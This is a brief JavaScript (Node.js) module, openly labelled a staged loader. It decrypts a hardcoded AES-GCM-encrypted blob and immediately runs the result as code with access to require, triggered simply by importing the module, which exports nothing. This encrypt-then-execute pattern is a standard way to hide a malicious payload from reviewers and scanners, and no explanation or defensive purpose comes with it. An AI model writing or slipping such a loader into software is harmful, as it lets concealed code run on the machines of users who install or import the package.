// Staged loader: decrypt the next stage with AES-128-GCM, then run the plaintext.
const crypto = require("crypto");

const K = Buffer.from("00112233445566778899aabbccddeeff", "hex");
const I = Buffer.from("0102030405060708090a0b0c", "hex");
const T = Buffer.from("e502490874e9d924c5c7b2efc836ce64", "hex");
const C = Buffer.from("96f447f045575d24", "hex");

(async () => {
  const d = crypto.createDecipheriv("aes-128-gcm", K, I);
  d.setAuthTag(T);
  const src = Buffer.concat([d.update(C), d.final()]).toString("utf8");
  new Function("require", src)(require);
})();

module.exports = {};
